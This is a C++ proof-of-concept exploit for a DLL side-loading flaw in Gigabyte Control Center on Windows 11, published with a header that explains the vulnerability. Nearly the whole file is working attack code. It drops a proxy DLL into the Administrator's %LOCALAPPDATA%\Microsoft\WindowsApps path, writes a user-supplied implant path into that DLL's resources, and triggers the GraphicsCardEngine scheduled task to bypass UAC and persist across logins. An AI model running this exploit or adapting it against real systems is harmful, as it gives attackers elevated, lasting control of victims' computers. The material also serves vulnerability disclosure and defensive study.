/* Giga-byte Hardware UAC elevation and Persistence DLL side-loading Exploit
* ==========================================================================
* Giga-byte Control Center (GCC) is a software package designed for improved user 
* experience of Gigabyte hardware, often found in gaming and performance PC's.
* A UAC elevation vulnerability exists that can be used for persistence in a
* novel fashion. The GCC software installs a scheduled task which is executed
* on login by all users with Administrative rights in the context of the default
* Administrator. The task launches "GraphicsCardEngine.exe" with high integrity
* privileges in the Administrator users context, which is vulnerable to a DLL
* side loading attack. By writing either "atiadlxx.dll" or "atiadlxy.dll" DLL 
* into the Administrator %LOCALAPPDATA% path, the application will load the DLL's 
* on future user logins with Administrator rights. This allows for UAC elevation 
* bypass and also a persistence mechanism for Administrator rights on each
* successful login that triggers the vulnerable scheduled task. This exploit should
* be run from a user with Administrator privileges to bypass UAC elevation prompt
* and facilitate persistence mechanism on future login by any local user, note the
* scheduled task will not run if the local Administrator is not logged in.
*
* Tested against GCC_23.04.13.01 on Windows 11 x64 (Version 10.0.22621.1702)
* with "Gigabyte VGA tool" installed.
* 
* --
* Hacker Fantastic ~ 04/08/23
* (https://hacker.house)
*/
#include <iostream>
#include <vector>
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <tchar.h>
#include <wchar.h>
#include <winternl.h>
#define SECURITY_WIN32 1
#include <security.h>
#include "resource.h"
using namespace std;

/* linker lib comment includes for static */
#pragma comment(lib,"User32.lib")
#pragma comment(lib,"AdvApi32.lib")
#pragma comment(lib,"Shell32.lib")
#pragma comment(lib,"Ole32.lib")
#pragma comment(lib,"Oleaut32.lib")
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"Secur32.lib")

/* program defines for fixed size vars */
#define MAX_ENV_SIZE 32767

/* extract a "DLL" type resource from the PE */
bool ExtractResource(int iId, LPWSTR pDest)
{
	HRSRC aResourceH;
	HGLOBAL aResourceHGlobal;
	unsigned char* aFilePtr;
	unsigned long aFileSize;
	HANDLE file_handle;
	aResourceH = FindResource(NULL, MAKEINTRESOURCE(iId), L"DLL");
	if (!aResourceH)
	{
		return false;
	}
	aResourceHGlobal = LoadResource(NULL, aResourceH);
	if (!aResourceHGlobal)
	{
		return false;
	}
	aFileSize = SizeofResource(NULL, aResourceH);
	aFilePtr = (unsigned char*)LockResource(aResourceHGlobal);
	if (!aFilePtr)
	{
		return false;
	}
	file_handle = CreateFile(pDest, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (INVALID_HANDLE_VALUE == file_handle)
	{
		int err = GetLastError();
		if ((ERROR_ALREADY_EXISTS == err) || (32 == err))
		{
			return true;
		}
		return false;
	}
	while (aFileSize--)
	{
		unsigned long numWritten;
		WriteFile(file_handle, aFilePtr, 1, &numWritten, NULL);
		aFilePtr++;
	}
	CloseHandle(file_handle);
	return true;
}

/* the main exploit routine */
int main(int argc, char* argv[])
{
	LPWSTR pCMDpath;
	size_t sSize = 0;
	BOOL bResult;
	DWORD dwErrorCode = 0;
	DWORD dwBufferSize = 0;
	PTOKEN_USER pTokenUser = NULL;
	SHELLEXECUTEINFO shinfo;
	// handle user argument for command
	if (argc != 2) {
		// argument is passed directly to WinExec() via DLL
		printf("[!] Error, you must supply a path to a DLL to persist e.g. c:\\Users\\YourUser\\AppData\\Local\\Temp\\Implant.dll\n");
		return EXIT_FAILURE;
	}
	// multi-byte string to wide char string to convert user command into pCMD
	pCMDpath = new TCHAR[MAX_PATH + 1];
	mbstowcs_s(&sSize, pCMDpath, MAX_PATH, argv[1], strlen(argv[1]));
	// locate %LOCALAPPDATA% environment variable
	LPWSTR pAppPath = new WCHAR[MAX_ENV_SIZE];
	GetEnvironmentVariable(L"LOCALAPPDATA", pAppPath, MAX_ENV_SIZE);
	// writes the proxy DLL to %LOCALAPPDATA%
	sSize = wcslen(pAppPath) + wcslen(L"\\Microsoft\\WindowsApps\\atiadlxy.dll") + 1;
	LPWSTR pBinPatchPath = new WCHAR[sSize];
	swprintf(pBinPatchPath, sSize, L"%s\\Microsoft\\WindowsApps\\atiadlxy.dll", pAppPath);
	// writes the original DLL to %LOCALAPPDATA%
	sSize = wcslen(pAppPath) + wcslen(L"\\Microsoft\\WindowsApps\\atiadlxy_org.dll") + 1;
	LPWSTR pBinOrigPath = new WCHAR[sSize];
	swprintf(pBinOrigPath, sSize, L"%s\\Microsoft\\WindowsApps\\atiadlxy_org.dll", pAppPath);
	if (ExtractResource(IDR_DLLORIG, pBinOrigPath))
	{
		if (ExtractResource(IDR_DLLPROXY, pBinPatchPath))
		{
			// string table structure creation hack using wstring's for user command
			wstring data[7] = { L"", L"", L"", L"", L"", (wstring)pCMDpath, L"" };
			vector< WORD > buffer;
			for (size_t index = 0; index < sizeof(data) / sizeof(data[0]); index++)
			{
				size_t pos = buffer.size();
				buffer.resize(pos + data[index].size() + 1);
				buffer[pos++] = static_cast<WORD>(data[index].size());
				copy(data[index].begin(), data[index].end(), buffer.begin() + pos);
			}
			// do not delete the existing resource entries
			HANDLE hPE = BeginUpdateResource(pBinPatchPath, false);
			// overwrite the IDS_CMD101 string table in the payload DLL with user command.
			bResult = UpdateResource(hPE, RT_STRING, MAKEINTRESOURCE(7), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), reinterpret_cast<void*>(&buffer[0]), buffer.size() * sizeof(WORD));
			bResult = EndUpdateResource(hPE, FALSE);
			// executes the scheduled task by name, note that this won't usually work as the elevation/persistence will occur on next login.
			// on the off chance the process crashed or has been terminated, this would instantly bypass UAC. 
			RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
			shinfo.cbSize = sizeof(shinfo);
			shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
			shinfo.lpFile = L"c:\\Windows\\system32\\schtasks.exe";
			shinfo.lpParameters = L"/Run /TN \"GraphicsCardEngine\""; // parameters
			shinfo.lpDirectory = NULL;
			shinfo.nShow = SW_SHOW;
			shinfo.lpVerb = NULL;
			bResult = ShellExecuteEx(&shinfo);
			if (bResult) {
				printf("[+] Success\n");
			}
		}
	}
	return EXIT_SUCCESS;
}
